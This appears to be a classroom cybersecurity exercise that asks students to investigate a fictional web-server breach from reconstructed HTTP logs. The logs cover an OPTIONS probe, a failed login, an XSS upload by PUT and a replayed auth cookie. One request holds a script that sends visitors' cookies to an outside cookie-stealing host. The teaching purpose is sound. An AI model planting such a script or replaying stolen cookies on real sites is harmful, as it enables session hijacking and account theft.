## Activity File: HTTP Requests and Responses

In this activity, you will be playing the role of a web app security engineer.

- There was a recent breach in one of your company's HTTP servers. Before the server went down, a suspicious IP address sent it a rapid sequence of requests and responses.
- The administrators of the web server attempted to recover and reconstruct much of the client-server HTTP request and response traffic.
- You are tasked with investigating the remaining HTTP logs in order to figure out what happened during the attack on the web server.

Use the [HTTP Reference Sheet](./HTTP_Reference.md) while working on this activity. 

:books: Use the following URL to learn about how web-based cross-site scripting attacks are used to steal cookies: [Geeks for Geeks: Cookie Tracking and Stealing Using Cross-Site Scripting Tracking](https://www.geeksforgeeks.org/cookie-tracking-stealing-using-cross-site-scripting/). 

- The information will be useful for answering the upcoming questions. Search the internet for "cross-site scripting cookie stealing" if you still need more resources.

### Instructions

The partially reconstructed HTTP requests and responses below were, at some point, exchanged with the suspicious IP address. A lot of requests and responses are missing, so we can only partially understand the attack. 

Review the partially reconstructed HTTP requests and responses. Answer the questions to figure out what happened during the breach on your company's web server.

1. The following partial response was sent to the suspicious IP address. The request was completely lost and unrecoverable.

   **HTTP Response 1**

     ```HTTP
     HTTP/1.1 200 OK
     Date: Tue, 25 Sep 2018 21:21:20 GMT
     Server: Apache/2.2.21 (Unix mod_ssl/2.2.21 OpenSSL/1.0.0k DAV/2 PHP/5.4.3)
     WWW-Authenticate: Cookie realm="fakesite"
     Allow: OPTIONS, GET, POST, HEAD, PUT
     ```

   - **Question:** What kind of request was used here that would cause an HTTP server to tell the client all of the HTTP request methods it will respond to?

   - **Analysis:** Do you think this HTTP request method can be used by an attacker to gather information about an HTTP server? Why or why not?

2. The system admins reported some corrupted HTTP traffic that occurred before the following recovered response:

   **HTTP Response 2**

     ```HTTP
     HTTP/1.1 401 Unauthorized
     WWW-Authenticate: Cookie realm="fakesite"
             form-action="/login"
             cookie-name=AUTH-COOKIE
     Content-Type: text/html

     <title>Unauthorized</title>
     <form action="/login" method=POST>
     <input type=hidden name=referer value="/fakesite/">
     <p><label>Username: <input name=user></label>
     <p><label>Password: <input name=pwd type=password></label>
     <p><button type=submit>Sign in</button>
     <p><a href="/register">Register for an account</a>
     </form>
     ```

   - **Questions:** 
      - What status code was returned in this response?
      - According to the response body, what kind of method was used to generate this HTTP response?
     - What sort of information was input to this HTTP request?

   - **Analysis:** Based on the information gathered from the status code and response body, what did the attacker try to do? Were they successful? 

3. The following HTTP request and response were also recovered:

   **HTTP Request 1**

     ```HTTP
     PUT /XSS.html HTTP/1.1
     User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
     Host: www.fakesite.com/blog

     <script type="text/javascript">
     document.location='http://133.7.13.37/cookiestealer.php?c='+document.cookie;
     </script>
     ```

   **HTTP Response 3**

     ```HTTP
     HTTP/1.1 201 Created
     Date: Mon, 05 May 2014 12:28:53 GMT
     Server: Apache/2.2.14 (Win32)
     Content-type: text/html
     Content-length: 30
     Connection: Closed
     ```

   - **Questions:** 
      - What type of method was used in the request?
      - What file name was uploaded to the site, according to the request body?

   - **Analysis:** 
      - Based on the request method and request body, what do you think happened here? 
      - How did the server respond?

4. The next partial request and header was received by our HTTP server. The data after this log was completely lost:

   **HTTP Request 4**

     ```HTTP
     GET https://www.fakesite.com/admin HTTP/1.1
     Cookie: $Version="1"; AUTH-COOKIE="sdf354s5c1s8e1s"; $Path="/admin"
     ```

   - **Question:** Look back at the previous response (HTTP Response 3). What request and headers are seen in this GET request?

   - **Analysis:** Is there anything interesting about the URL requested?
